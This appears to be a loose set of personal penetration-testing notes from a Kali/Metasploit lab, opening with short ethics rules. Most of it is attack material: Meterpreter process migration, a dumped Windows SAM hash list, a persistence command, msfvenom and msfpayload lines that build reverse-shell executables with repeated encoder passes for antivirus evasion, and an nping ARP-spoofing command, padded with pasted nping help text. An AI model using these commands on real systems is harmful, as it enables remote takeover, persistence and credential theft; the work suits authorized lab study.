# rules
  * no harm
  * defiine and honor boundaries
  * consider contermeasures only after haking is complete
  * get  agreement in advance
  * document everything

# start postgres db
    * Metasploit uses PostgreSQL as its database so it needs to be launched first.

        service postgresql start
        ** You can verify that PostgreSQL is running by checking the output of ss -ant and making sure that port 5432 is listening.

        State Recv-Q Send-Q Local Address:Port Peer Address:Port
        LISTEN 0 128 :::22 :::*
        LISTEN 0 128 *:22 *:*
        LISTEN 0 128 127.0.0.1:5432 *:*
        LISTEN 0 128 ::1:5432 :::*
    * Initialise the Metasploit PostgreSQL Database

        With PostgreSQL up and running, we next need to create and initialize the msf database.

        pg_ctl init -D /var/db/postgresql/defaultdb/
        pg_ctl -D /var/db/postgresql/defaultdb -l /var/db/postgresql/defaultdb/logfile start
        su - postgres -c "pg_ctl -D /var/db/postgresql/defaultdb/ start"

        psql
        create user root;
        create database ms;

        msfdb init
    * Launch msfconsole in Kali

        Now that the PostgreSQL service is up and running and the database is initialized, you can launch msfconsole and verify database connectivity with the db_status command as shown below.

        msfconsole
        msf > db_status
        [*] postgresql connected to msf3
        msf >

         umount -a -t cifs -l


         apt-cdrom -d=/dev/sr0 add

         traceroute www.google.com 
             -f 8   //ttl
             -w 2   //wait time
             -q 4   // query count
             -n     // not use hostname,use ip address instead

    * wireshare
        ip.src == 192.168.11.1
        udp.port==68 or udp.port==67


    * Metasploit
        [-] Meterpreter Exception: Rex::Post::Meterpreter::RequestError stdapi_registry_open_key: Operation failed: Access is denied.
        [-] This script requires the use of a SYSTEM user context (hint: migrate into service process)
        find a system process get pid
        migrate pid

Administrator:500:c0ad129bd4e0e675ab0b09b894a430a5:64f2a499e4fc2846acfaa3c2381ed559:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:bc156931ebe3fa457e2260fe8b464b5c:04d8217f38d4aab7c2ad9ee56ed93b01:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:2f99608b6d63ec34d85538bdef5916e1:::

[*] Authenticating to 10.0.128.4:445|WORKGROUP as user 'Administrator'...
 
[-] FAILED! The remote host has only provided us with Guest privileges. 
    Please make sure that the correct username and password have been provided. 
    Windows XP systems that are not part of a domain will only provide Guest privileges to network logins by default.


run scraper

    timeout

pessistent:
    * run persistence -X -i 50 -p 443 -r ip
    
payload:    
    msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.128.0 lport=31337 -f exe -o /var/www/payload1.exe

    msfpayload windows/meterpreter/reverse_tcp lhost=10.0.128.0 lport=33134 X > /var/www/payload1.exe

    msfpayload windows/shell_reverse_tcp lhost=10.0.128.0 lport=33134 R | msfencode -e x86/shikata_ga_nai -t exe > /var/www/payload2.exe 


    OPTIONS:

    -a <opt>  The architecture to encode as
    -b <opt>  The list of characters to avoid: '\x00\xff'
    -c <opt>  The number of times to encode the data
    -d <opt>  Specify the directory in which to look for EXE templates
    -e <opt>  The encoder to use
    -h        Help banner
    -i <opt>  Encode the contents of the supplied file path
    -k        Keep template working; run payload in new thread (use with -x)
    -l        List available encoders
    -m <opt>  Specifies an additional module search path
    -n        Dump encoder information
    -o <opt>  The output file
    -p <opt>  The platform to encode for
    -s <opt>  The maximum size of the encoded data
    -t <opt>  The output format: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-net,psh-reflection,vba,vba-exe,vbs,war
    -v        Increase verbosity
    -x <opt>  Specify an alternate executable template

    msfpayload windows/meterpreter/reverse_tcp lhost=10.0.128.0 lport=33134 R | msfencode -e x86/shikata_ga_nai -c 5 -t raw | \
        msfencode -e x86/alpha_upper -c 2 -t raw | msfencode -e x86/shikata_ga_nai -t raw -c 5 | \
        msfencode -e x86/countdown -c 5 -t exe -o /var/www/payload3.exe


    Nping 0.7.30 ( https://nmap.org/nping )
Usage: nping [Probe mode] [Options] {target specification}

TARGET SPECIFICATION:
  Targets may be specified as hostnames, IP addresses, networks, etc.
  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.*.1-24
PROBE MODES:
  --tcp-connect                    : Unprivileged TCP connect probe mode.
  --tcp                            : TCP probe mode.
  --udp                            : UDP probe mode.
  --icmp                           : ICMP probe mode.
  --arp                            : ARP/RARP probe mode.
  --tr, --traceroute               : Traceroute mode (can only be used with
                                     TCP/UDP/ICMP modes).
TCP CONNECT MODE:
   -p, --dest-port <port spec>     : Set destination port(s).
   -g, --source-port <portnumber>  : Try to use a custom source port.
TCP PROBE MODE:
   -g, --source-port <portnumber>  : Set source port.
   -p, --dest-port <port spec>     : Set destination port(s).
   --seq <seqnumber>               : Set sequence number.
   --flags <flag list>             : Set TCP flags (ACK,PSH,RST,SYN,FIN...)
   --ack <acknumber>               : Set ACK number.
   --win <size>                    : Set window size.
   --badsum                        : Use a random invalid checksum.
UDP PROBE MODE:
   -g, --source-port <portnumber>  : Set source port.
   -p, --dest-port <port spec>     : Set destination port(s).
   --badsum                        : Use a random invalid checksum.
ICMP PROBE MODE:
  --icmp-type <type>               : ICMP type.
  --icmp-code <code>               : ICMP code.
  --icmp-id <id>                   : Set identifier.
  --icmp-seq <n>                   : Set sequence number.
  --icmp-redirect-addr <addr>      : Set redirect address.
  --icmp-param-pointer <pnt>       : Set parameter problem pointer.
  --icmp-advert-lifetime <time>    : Set router advertisement lifetime.
  --icmp-advert-entry <IP,pref>    : Add router advertisement entry.
  --icmp-orig-time  <timestamp>    : Set originate timestamp.
  --icmp-recv-time  <timestamp>    : Set receive timestamp.
  --icmp-trans-time <timestamp>    : Set transmit timestamp.
ARP/RARP PROBE MODE:
  --arp-type <type>                : Type: ARP, ARP-reply, RARP, RARP-reply.
  --arp-sender-mac <mac>           : Set sender MAC address.
  --arp-sender-ip  <addr>          : Set sender IP address.
  --arp-target-mac <mac>           : Set target MAC address.
  --arp-target-ip  <addr>          : Set target IP address.
IPv4 OPTIONS:
  -S, --source-ip                  : Set source IP address.
  --dest-ip <addr>                 : Set destination IP address (used as an
                                     alternative to {target specification} ).
  --tos <tos>                      : Set type of service field (8bits).
  --id  <id>                       : Set identification field (16 bits).
  --df                             : Set Don't Fragment flag.
  --mf                             : Set More Fragments flag.
  --ttl <hops>                     : Set time to live [0-255].
  --badsum-ip                      : Use a random invalid checksum.
  --ip-options <S|R [route]|L [route]|T|U ...> : Set IP options
  --ip-options <hex string>                    : Set IP options
  --mtu <size>                     : Set MTU. Packets get fragmented if MTU is
                                     small enough.
IPv6 OPTIONS:
  -6, --IPv6                       : Use IP version 6.
  --dest-ip                        : Set destination IP address (used as an
                                     alternative to {target specification}).
  --hop-limit                      : Set hop limit (same as IPv4 TTL).
  --traffic-class <class> :        : Set traffic class.
  --flow <label>                   : Set flow label.
ETHERNET OPTIONS:
  --dest-mac <mac>                 : Set destination mac address. (Disables
                                     ARP resolution)
  --source-mac <mac>               : Set source MAC address.
  --ether-type <type>              : Set EtherType value.
PAYLOAD OPTIONS:
  --data <hex string>              : Include a custom payload.
  --data-string <text>             : Include a custom ASCII text.
  --data-length <len>              : Include len random bytes as payload.
ECHO CLIENT/SERVER:
  --echo-client <passphrase>       : Run Nping in client mode.
  --echo-server <passphrase>       : Run Nping in server mode.
  --echo-port <port>               : Use custom <port> to listen or connect.
  --no-crypto                      : Disable encryption and authentication.
  --once                           : Stop the server after one connection.
  --safe-payloads                  : Erase application data in echoed packets.
TIMING AND PERFORMANCE:
  Options which take <time> are in seconds, or append 'ms' (milliseconds),
  's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m, 0.25h).
  --delay <time>                   : Adjust delay between probes.
  --rate  <rate>                   : Send num packets per second.
MISC:
  -h, --help                       : Display help information.
  -V, --version                    : Display current version number.
  -c, --count <n>                  : Stop after <n> rounds.
  -e, --interface <name>           : Use supplied network interface.
  -H, --hide-sent                  : Do not display sent packets.
  -N, --no-capture                 : Do not try to capture replies.
  --privileged                     : Assume user is fully privileged.
  --unprivileged                   : Assume user lacks raw socket privileges.
  --send-eth                       : Send packets at the raw Ethernet layer.
  --send-ip                        : Send packets using raw IP sockets.
  --bpf-filter <filter spec>       : Specify custom BPF filter.
OUTPUT:
  -v                               : Increment verbosity level by one.
  -v[level]                        : Set verbosity level. E.g: -v4
  -d                               : Increment debugging level by one.
  -d[level]                        : Set debugging level. E.g: -d3
  -q                               : Decrease verbosity level by one.
  -q[N]                            : Decrease verbosity level N times
  --quiet                          : Set verbosity and debug level to minimum.
  --debug                          : Set verbosity and debug to the max level.
EXAMPLES:
  nping scanme.nmap.org
  nping --tcp -p 80 --flags rst --ttl 2 192.168.1.1
  nping --icmp --icmp-type time --delay 500ms 192.168.254.254
  nping --echo-server "public" -e wlan0 -vvv
  nping --echo-client "public" echo.nmap.org --tcp -p1-1024 --flags ack

SEE THE MAN PAGE FOR MANY MORE OPTIONS, DESCRIPTIONS, AND EXAMPLES

nping --arp --arp-type arp-reply --arp-sender-mac a0:8d:16:55:ce:38 --arp-sender-ip 192.168.43.1 --arp-target-mac 84:4b:f5:85:91:8e --arp-target-ip 192.168.43.206 192.168.43.206
echo "this is a test from all of you" |  ncat -u 127.0.0.1 4913


* rce
  arbitrary code execution